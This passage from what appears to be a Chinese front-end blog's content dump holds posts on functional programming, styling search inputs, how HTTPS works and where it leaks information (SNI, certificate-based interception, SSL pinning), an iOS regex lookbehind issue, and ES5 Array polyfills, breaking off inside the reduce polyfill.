<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cbb9a98c4e60d8ec.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-cb1449cf1705be2c.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>数据不可变： 它要求你所有的数据都是不可变的，这意味着如果你想修改一个对象，那你应该创建一个新的对象用来修改，而不是修改已有的对象。 无状态： 主要是强调对于一个函数，不管你何时运行，它都应该像第一次运行一样，给定相同的输入，给出相同的输出，完全不依赖外部状态的变化。 为了实现这个目标，函数式编程提出函数应该具备的特性：没有副作用和纯函数。</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7fe37c43559a2198.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bfbb62895921c27e.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>在不纯的版本中，checkAge 的结果将取决于 minimum 这个可变变量的值。换句话说，它取决于系统状态（system state）；，因为它引入了外部的环境，从而增加了认知负荷。但这种依赖状态是影响系统复杂度的罪魁祸首，输入值之外的因素能够左右 checkAge 的返回值，不仅让它变得不纯，而且导致每次我们思考整个软件的时候都痛苦不堪。 另一方面，使用纯函数的形式，函数就能做到自给自足。</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-44dafec478425db0.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>保证函数没有副作用，一来能保证数据的不可变性，二来能避免很多因为共享状态带来的问题。当你一个人维护代码时候可能还不明显，但随着项目的迭代，项目参与人数增加，大家对同一变量的依赖和引用越来越多，这种问题会越来越严重。最终可能连维护者自己都不清楚变量到底是在哪里被改变而产生Bug。<code>传递引用一时爽，代码重构火葬场</code>  </p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e4daf335f0fe4716.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-15e68c71c8faa114.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c933554bb5a211a3.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>为什么这个单元函数很重要？还记得我们之前说过的，函数的返回值，有且只有一个嘛？ 如果我们想顺利的组装流水线，那我就必须保证我每个加工站的输出刚好能流向下个工作站的输入。因此，在流水线上的加工站必须都是单元函数。</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f0ab24af87d1c69a.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-01a3212c7593560d.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e5e473d34cd15743.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4fdfb5310ffc3c0c.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>函数组合的好处显而易见，它让代码变得简单而富有可读性，同时通过不同的组合方式，我们可以轻易组合出其他常用函数，让我们的代码更具表现力</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c947c9ccd7dccd73.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d1f499f381e2ff6c.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>函数式编程很理想，但是我们还是要与外部数据进行交互，不然我们的代码就没有意义当一套复杂的数据响应被应用于一套复杂的应用中时，开发者往往在响应来响应去的连环嵌套响应中被搞昏头，因为数据的响应而牵一发动全身，导致整个响应很难控制，这是数据响应必须解决的问题。</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-dee5d9f145d85c79.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c027a0b749c44425.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1badbd997d2e324e.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>HTML5去除input[type=search]的默认边框和删除按钮</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/HTML5%E5%8E%BB%E9%99%A4input-%5Btype=search%5D-%E7%9A%84%E9%BB%98%E8%AE%A4%E8%BE%B9%E6%A1%86%E5%92%8C%E5%88%A0%E9%99%A4%E6%8C%89%E9%92%AE/</url>
    <content><![CDATA[<p>input [type=search]  是HTML新属性 ， 定义用于搜索的文本字段；</p>
<p>x-webkit-speech  属性：在GOOGLE浏览器上  还会显示一个小话筒</p>
<p> autocomplete=”off”  属性  关闭浏览器自动记录之前输入的值</p>
<p>webkit内核浏览器里 input 框类型如果是 type=”search” </p>
<p>那么将会有边框问题，border:0px 也不能起到作用；</p>
<p>解决办法是在CSS里写上</p>
<p>input[type=”search”]{-webkit-appearance:none;} </p>
<p>既可解决。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input[type&#x3D;search] &#123;</span><br><span class="line">-webkit-appearance: textfield;</span><br><span class="line">-webkit-box-sizing: content-box;</span><br><span class="line">font-family: inherit;</span><br><span class="line">font-size: 100%;</span><br><span class="line">&#125;</span><br><span class="line">input::-webkit-search-decoration,</span><br><span class="line">input::-webkit-search-cancel-button &#123;</span><br><span class="line">display: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>HTTPS-为什么安全--真的安全吗-</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/HTTPS-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AE%89%E5%85%A8--%E7%9C%9F%E7%9A%84%E5%AE%89%E5%85%A8%E5%90%97-/</url>
    <content><![CDATA[<p><strong>一、HTTPS 为什么安全</strong></p>
<p>HTTPS，也称作 HTTP over TLS，TLS 前身是 SSL，会有各个版本。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-fd6d4d24b72aadc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>TLS协议在TCP/IP协议栈中的关系</p>
<p>上图描述了在TCP/IP协议栈中TLS(各子协议）和 HTTP 的关系。HTTP+TLS 也就是 HTTPS，和 HTTP 相比，<strong>HTTPS的优势：</strong></p>
<ul>
<li><p>  <strong>数据完整性：内容传输经过完整性校验</strong></p>
</li>
<li><p>  <strong>数据隐私性：内容经过对称加密，每个连接生成一个唯一的加密密钥</strong></p>
</li>
<li><p>  <strong>身份认证：第三方无法伪造服务端（客户端）身份</strong></p>
</li>
</ul>
<p>上面内容参考了HTTPS工作原理。（石头在N 久前用印象笔记收藏的，现在好多原文访问不了了）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5719d83a695f5af8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>HTTPS 原理</p>
<p>上图就是大致介绍了 HTTPS 的握手流程，感兴趣的同学可以用 WireShark 抓包详细看看其中的每一个步骤，有助于理解 HTTPS 的完整流程。这里，我就不详述了。</p>
<p><strong>大致就是客户端和服务端通过“握手会谈”商量出一个双方支持的加密算法和相应随机参数，得到一对密钥，后续的传输的内容都通过这对密钥进行加解密。</strong></p>
<p>这对密钥很牛皮，比如要加密传输消息『tangleithu』，客户端通过公钥加密得到的密文『xyyaabbccdd』进行传输，服务端用自己的私钥对密文解密，恰好能得到『tangleithu』。中间错一位都不行，这样就保证了数据完整和隐私性。</p>
<p><strong>因此，你在通过 HTTPS 访问网站的时候，就算流量被截取监听，获取到的信息也是加密的，啥实质性的内容也看不到。</strong></p>
<p>例如，如下图所示，当我访问某个网站，此时通过 wireshark 抓包得到的信息，能获得仅仅是一些通信的IP地址而已。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-ce31fa33f0af5bd4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><code>HTTPS加密传输</code></p>
<p>这下放心了吗？</p>
<p>摸鱼的过程中，就算访问的 IP 地址被知道了，好像也无关紧要？</p>
<p>其实，有了 IP 地址也能获取不少信息了。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-948f6a8849792d67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>还好这个 IP 搜出来是 github，而不是……</p>
<p>你或许会高兴，连个网站域名都看不到，可以放心摸鱼了。不过，这是真的吗？</p>
<p><strong>二、HTTPS 真的安全吗？</strong></p>
<p><strong>HTTPS 真的完全安全吗？连访问的域名都获取不到？答案是否定的。</strong></p>
<p><strong>上述 HTTPS 在握手阶段有一个很重要的东西 —— 证书。</strong></p>
<p><strong>1.SNI —— 域名裸奔</strong></p>
<p>当访问 HTTPS 站点时，会首先与服务器建立 SSL 连接，第一步就是请求服务器的证书。</p>
<p>当一个 Server IP 只对应一个域名（站点）时，很方便，任意客户端请求过来，无脑返回该域名（服务）对应的证书即可。但 IP 地址（IPv4）是有限的呀，多个域名复用同一个 IP 地址的时候怎么办？</p>
<p>服务器在发送证书时，不知道浏览器访问的是哪个域名，所以不能根据不同域名发送不同的证书。</p>
<p>因此 TLS 协议升级了，多了 SNI 这个东西，SNI 即 Server Name Indication，是为了解决一个服务器使用多个域名和证书的 SSL/TLS 扩展。</p>
<p>现在主流客户端都支持这个协议的。别问我怎么知道这个点的，之前工作上因为这个事情还费了老大劲儿……</p>
<p>它的原理是：在与服务器建立 SSL 连接之前，先发送要访问站点的域名（Hostname），这样服务器会根据这个域名返回一个合适的证书。此时还没有办法进行加解密，因此至少这个域名是裸奔的。</p>
<p>如下图所示，上面的截图其实是访问网站的抓包情况，客户端发送握手请求时，很自觉带上了自己的域名。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0a184ff9bbd874b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>HTTPS SNI</p>
<p>因此，即便是 HTTPS，访问的域名信息也是裸奔状态。你上班期间访问小电影网站，都留下了痕迹，若接入了公司网络，就自然而然被抓个正着。</p>
<p>除了域名是裸奔外，其实还有更严重的风险，那就是中间人攻击。</p>
<p><strong>2.中间人攻击</strong></p>
<p>前面也提到 HTTPS 中的关键其实在于这个证书。从名字可以看出来，中间人攻击就是在客户端、服务器之间多了个『中介』，『中介』在客户端、服务器双方中伪装对方，如下图所示，这个『MitmProxy』充当了中间人，互相欺骗：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4d75f48b1a4baae1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>中间人攻击，来源 evil0x</p>
<p>可以安装 MitmProxy 或者 Fiddler 之类的抓包软件尝试一把，然后开启代理。</p>
<p>此时用手机访问百度，得到的信息如下：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-61b38a14afc3cfbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>证书信任前</p>
<p>提示，连接不是私密连接，其实就是浏览器识别了证书不太对劲，没有信任。而如果此时手机安装了 Fiddler 的证书，就会正常访问。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c8a43fe23891db6c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>证书信任后可正常访问</p>
<p>因此，当你信任证书后，在中间人面前，又是一览无余了。</p>
<p>而如果你用了公司电脑，估计你有相应的操作让信任证书吧，或者手机上是否有安装类似的客户端软件吧？</p>
<p>抓紧时间看看手机的证书安装明细</p>
<p><strong>三、如何防止信息安全，反爬</strong></p>
<p>前面提到，要实施中间人攻击，关键在于证书是否得到信任。浏览器的行为是证书可以让用户授权是否信任，而 APP 就可以开发者自己控制。</p>
<p>比如我尝试通过类似的方式对某匿名社区进行抓包解密 HTTPS，但最终失败了，为什么呢？</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-890b702b230b7c79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>这就要谈到『SSL Pinning』技术。</p>
<p>App 可以自己检验 SSL 握手时服务端返回的证书是否合法，“SSL pinning” 技术说的就是在 App 中只信任固定的证书或者公钥。</p>
<p>因为在握手阶段服务端的证书必须返回给客户端，如果客户端在打包的时候，就把服务端证书放到本地，在握手校验证书的环节进行比较，服务端返回的证书和本地内置的证书一模一样，才发起网络请求。否则，直接断开连接，不可用。</p>
<p>当然，一般情况下，用这种技术也就能防止 HTTPS 信息被解密了。</p>
<p>不过，也还有其他的技术能够破解这种方法，比如 Android 下的一些 Hook 技术，具体而言就是绕过本地证书强校验的逻辑。感兴趣的同学可以抱着学习目的研究一下。不过据说这种方式需要对系统进行 Root、越狱等，需要一些更高权限的设置。</p>
<p>因此，也告诫我们，一定不要乱安装一些软件，稍不注意可能就中招，让自己在互联网上进行裸奔。一方面个人隐私信息等泄露，另外一个方面可能一些非常重要的如账户密码等也可能被窃取。</p>
<p><strong>四、可能的监控手段有哪些？</strong></p>
<p>办公电脑当然要接入公司网络，通过上面介绍的内容，你也应该知道，你在什么时候浏览了哪些网站，公司其实都是一清二楚的。</p>
<p>若自己的手机如果接入了公司网络也是一模一样（连 Agent 软件都不需要装）。这就提醒我们，私人上网尽量用自己的移动网络呀。</p>
<p>上面提到，如一些涉及隐私的敏感信息，如一些 PC 软件、手机 App 自己内部加密传输的话，内容加密（包括但不限于 HTTPS）不被破解也问题不大。</p>
<p>不过，这当然依赖这些软件设计者的水平了。比如同一个匿名用户对外展示的 ID 不能相同，如果是同一个的话也恰好暴露了逻辑漏洞。</p>
<p>当然，我们还是不要抱有侥幸心理，在监管的要求下，如果确实有一些违法等不恰当的言论等，始终还是有门路找到你的。</p>
<p>更何况，一般办公电脑都会预安装一些公司安全软件，至于这些软件究竟都干了些什么，有没有进行传说中悄悄截图什么的，这就因人（公司）而异了。（不讨论类似行为是否涉及到侵犯了员工隐私等问题）</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>IOS Invalid regular expression： invalid group specifier name</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/IOSInvalidregularexpression/</url>
    <content><![CDATA[<p>如果正则表达式中包含零宽断言的话 , 在安卓手机上正常 , 但是在ios上会报以下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Info Warn Error SyntaxError: Invalid regular expression: invalid group specifier name</span><br></pre></td></tr></table></figure>
<p><code>常用零宽断言：?&lt;=、?&lt;!、?!、?=</code>;<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let reg &#x3D; new RegExp(&#96;(?&lt;&#x3D;\\b$&#123;key&#125;&#x3D;)[^&amp;]*&#96;) , str &#x3D; this.params || &#39;&#39;, target &#x3D; str.match(reg); if(target) &#123;  return target[0] &#125;</span><br></pre></td></tr></table></figure><br>这种写法在安卓是正常的，IOS就不行，因为该正则包含了零宽断言，会导致页面空白，打不开，需要相对应的转换才能使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let reg &#x3D; new RegExp(&#96;(^|&amp;)$&#123;key&#125;&#x3D;([^&amp;]*)(&amp;|$)&#96;),str &#x3D; this.params || &#39;&#39;, target &#x3D; str.match(reg);if(target) &#123; return target[2]&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JS Array常用方法详解及兼容性代码（一）</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JS-Array%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%85%BC%E5%AE%B9%E6%80%A7%E4%BB%A3%E7%A0%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>[ES5中，Array新增API之forEach、filter、map、reduce]</p>
<h2 id="一：-forEach"><a href="#一：-forEach" class="headerlink" title="一： forEach"></a>一： forEach</h2><p>forEach() 方法对数组的每个元素执行一次提供的函数。<br><strong>注意:</strong> <code>没有返回一个新数组! &amp; 没有返回值!</code><br><strong>应用场景：</strong>为一些相同的元素，绑定事件处理器！</p>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array.forEach(callback(currentValue, index, array)&#123;</span><br><span class="line">    &#x2F;&#x2F;do something</span><br><span class="line">&#125;, this)</span><br><span class="line"></span><br><span class="line">array.forEach(callback[, thisArg])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code>:<br>为数组中每个元素执行的函数，该函数接收三个参数：</p>
<blockquote>
<p><code>currentValue(当前值)</code><br>数组中正在处理的当前元素。<br><code>index(索引)</code><br>数组中正在处理的当前元素的索引。<br><code>array</code><br>forEach()方法正在操作的数组。</p>
</blockquote>
<p><code>thisArg</code>可选<br>可选参数。当执行回调 函数时用作this的值(参考对象)。</p>
<p><strong>返回值</strong><br>undefined</p>
<p><strong>注意：</strong><code>没有办法中止或者跳出 forEach 循环，除了抛出一个异常。如果你需要这样，使用forEach()方法是错误的，你可以用一个简单的循环作为替代。如果您正在测试一个数组里的元素是否符合某条件，且需要返回一个布尔值，那么可使用 Array.every或 Array.some。如果可用，新方法 find()或者findIndex 也可被用于真值测试的提早终止。</code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.forEach) &#123;</span><br><span class="line"></span><br><span class="line">  Array.prototype.forEach &#x3D; function(callback, thisArg) &#123;</span><br><span class="line"></span><br><span class="line">    var T, k;</span><br><span class="line"></span><br><span class="line">    if (this &#x3D;&#x3D; null) &#123;</span><br><span class="line">      throw new TypeError(&#39; this is null or not defined&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 1. Let O be the result of calling toObject() passing the</span><br><span class="line">    &#x2F;&#x2F; |this| value as the argument.</span><br><span class="line">    var O &#x3D; Object(this);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 2. Let lenValue be the result of calling the Get() internal</span><br><span class="line">    &#x2F;&#x2F; method of O with the argument &quot;length&quot;.</span><br><span class="line">    &#x2F;&#x2F; 3. Let len be toUint32(lenValue).</span><br><span class="line">    var len &#x3D; O.length &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 4. If isCallable(callback) is false, throw a TypeError exception. </span><br><span class="line">    &#x2F;&#x2F; See: http:&#x2F;&#x2F;es5.github.com&#x2F;#x9.11</span><br><span class="line">    if (typeof callback !&#x3D;&#x3D; &quot;function&quot;) &#123;</span><br><span class="line">      throw new TypeError(callback + &#39; is not a function&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 5. If thisArg was supplied, let T be thisArg; else let</span><br><span class="line">    &#x2F;&#x2F; T be undefined.</span><br><span class="line">    if (arguments.length &gt; 1) &#123;</span><br><span class="line">      T &#x3D; thisArg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 6. Let k be 0</span><br><span class="line">    k &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 7. Repeat, while k &lt; len</span><br><span class="line">    while (k &lt; len) &#123;</span><br><span class="line"></span><br><span class="line">      var kValue;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; a. Let Pk be ToString(k).</span><br><span class="line">      &#x2F;&#x2F;    This is implicit for LHS operands of the in operator</span><br><span class="line">      &#x2F;&#x2F; b. Let kPresent be the result of calling the HasProperty</span><br><span class="line">      &#x2F;&#x2F;    internal method of O with argument Pk.</span><br><span class="line">      &#x2F;&#x2F;    This step can be combined with c</span><br><span class="line">      &#x2F;&#x2F; c. If kPresent is true, then</span><br><span class="line">      if (k in O) &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; i. Let kValue be the result of calling the Get internal</span><br><span class="line">        &#x2F;&#x2F; method of O with argument Pk.</span><br><span class="line">        kValue &#x3D; O[k];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; ii. Call the Call internal method of callback with T as</span><br><span class="line">        &#x2F;&#x2F; the this value and argument list containing kValue, k, and O.</span><br><span class="line">        callback.call(T, kValue, k, O);</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F; d. Increase k by 1.</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 8. return undefined</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二：filter"><a href="#二：filter" class="headerlink" title="二：filter"></a>二：filter</h2><p>filter() 方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。 </p>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var new_array &#x3D; arr.filter(callback[, thisArg])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code>:<br>用来测试数组的每个元素的函数。调用时使用参数 (element, index, array)。<br>返回true表示保留该元素（通过测试），false则不保留<br><code>thisArg</code>可选<br>可选参数。当执行回调 函数时用作this的值(参考对象)。</p>
<p><strong>返回值</strong><br>一个新的通过测试的元素的集合的数组</p>
<p><strong>注意：</strong><code>filter 不会改变原数组，它返回过滤后的新数组。</code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.filter)</span><br><span class="line">&#123;</span><br><span class="line">  Array.prototype.filter &#x3D; function(fun &#x2F;* , thisArg*&#x2F;)</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">    if (this &#x3D;&#x3D;&#x3D; void 0 || this &#x3D;&#x3D;&#x3D; null)</span><br><span class="line">      throw new TypeError();</span><br><span class="line"></span><br><span class="line">    var t &#x3D; Object(this);</span><br><span class="line">    var len &#x3D; t.length &gt;&gt;&gt; 0;</span><br><span class="line">    if (typeof fun !&#x3D;&#x3D; &quot;function&quot;)</span><br><span class="line">      throw new TypeError();</span><br><span class="line"></span><br><span class="line">    var res &#x3D; [];</span><br><span class="line">    var thisArg &#x3D; arguments.length &gt;&#x3D; 2 ? arguments[1] : void 0;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      if (i in t)</span><br><span class="line">      &#123;</span><br><span class="line">        var val &#x3D; t[i];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; NOTE: Technically this should Object.defineProperty at</span><br><span class="line">        &#x2F;&#x2F;       the next index, as push can be affected by</span><br><span class="line">        &#x2F;&#x2F;       properties on Object.prototype and Array.prototype.</span><br><span class="line">        &#x2F;&#x2F;       But that method&#39;s new, and collisions should be</span><br><span class="line">        &#x2F;&#x2F;       rare, so use the more-compatible alternative.</span><br><span class="line">        if (fun.call(thisArg, val, i, t))</span><br><span class="line">          res.push(val);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三：map"><a href="#三：map" class="headerlink" title="三：map"></a>三：map</h2><p>map() 方法创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。<br><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let new_array &#x3D; arr.map(function callback(currentValue, index, array) &#123; </span><br><span class="line">    &#x2F;&#x2F; Return element for new_array </span><br><span class="line">&#125;[, thisArg])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code>:<br>生成新数组元素的函数，使用三个参数：</p>
<blockquote>
<p><code>currentValue</code><br>callback 的第一个参数，数组中正在处理的当前元素。<br><code>index</code><br>callback 的第二个参数，数组中正在处理的当前元素的索引。<br><code>array</code><br>callback 的第三个参数，map 方法被调用的数组。</p>
</blockquote>
<p><code>thisArg</code>可选<br>可选参数。当执行回调 函数时用作this的值(参考对象)。</p>
<p><strong>返回值</strong><br>一个新数组，每个元素都是回调函数的结果。</p>
<p><strong>注意：</strong><code>不修改调用它的原数组本身（当然可以在 callback 执行时改变原数组）。</code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.map) &#123;</span><br><span class="line">  Array.prototype.map &#x3D; function(callback, thisArg) &#123;</span><br><span class="line"></span><br><span class="line">    var T, A, k;</span><br><span class="line"></span><br><span class="line">    if (this &#x3D;&#x3D; null) &#123;</span><br><span class="line">      throw new TypeError(&quot; this is null or not defined&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 1. 将O赋值为调用map方法的数组.</span><br><span class="line">    var O &#x3D; Object(this);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 2.将len赋值为数组O的长度.</span><br><span class="line">    var len &#x3D; O.length &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 3.如果callback不是函数,则抛出TypeError异常.</span><br><span class="line">    if (Object.prototype.toString.call(callback) !&#x3D; &quot;[object Function]&quot;) &#123;</span><br><span class="line">      throw new TypeError(callback + &quot; is not a function&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 4. 如果参数thisArg有值,则将T赋值为thisArg;否则T为undefined.</span><br><span class="line">    if (thisArg) &#123;</span><br><span class="line">      T &#x3D; thisArg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 5. 创建新数组A,长度为原数组O长度len</span><br><span class="line">    A &#x3D; new Array(len);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 6. 将k赋值为0</span><br><span class="line">    k &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 7. 当 k &lt; len 时,执行循环.</span><br><span class="line">    while(k &lt; len) &#123;</span><br><span class="line"></span><br><span class="line">      var kValue, mappedValue;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F;遍历O,k为原数组索引</span><br><span class="line">      if (k in O) &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;kValue为索引k对应的值.</span><br><span class="line">        kValue &#x3D; O[ k ];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 执行callback,this指向T,参数有三个.分别是kValue:值,k:索引,O:原数组.</span><br><span class="line">        mappedValue &#x3D; callback.call(T, kValue, k, O);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 返回值添加到新数组A中.</span><br><span class="line">        A[ k ] &#x3D; mappedValue;</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F; k自增1</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 8. 返回新数组A</span><br><span class="line">    return A;</span><br><span class="line">  &#125;;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="四：reduce"><a href="#四：reduce" class="headerlink" title="四：reduce"></a>四：reduce</h2><p>reduce() 方法对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。<br><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr.reduce(callback[, initialValue])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code>:<br>执行数组中每个值的函数，包含四个参数：</p>
<blockquote>
<p><code>accumulator</code><br>累加器累加回调的返回值; 它是上一次调用回调时返回的累积值，或initialValue（如下所示）。<br><code>currentValue</code><br>数组中正在处理的元素。<br><code>currentIndex</code>可选<br>数组中正在处理的当前元素的索引。 如果提供了initialValue，则索引号为0，否则为索引为1。<br><code>array</code>可选<br>调用reduce的数组</p>
</blockquote>
<p><code>initialValue</code>可选<br>用作第一个调用 callback的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。</p>
<p><strong>返回值</strong><br>函数累计处理的结果</p>
<p><strong>注意：</strong><code>如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引0开始。</code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.reduce) &#123;</span><br><span class="line">  Object.defineProperty(Array.prototype, &#39;reduce&#39;, &#123;</span><br><span class="line">    value: function(callback &#x2F;*, initialValue*&#x2F;) &#123;</span><br><span class="line">      if (this &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">        throw new TypeError( &#39;Array.prototype.reduce &#39; + </span><br><span class="line">          &#39;called on null or undefined&#39; );</span><br><span class="line">      &#125;</span><br><span class="line">      if (typeof callback !&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">        throw new TypeError( callback +</span><br><span class="line">          &#39; is not a function&#39;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 1. Let O be ? ToObject(this value).</span><br><span class="line">      var o &#x3D; 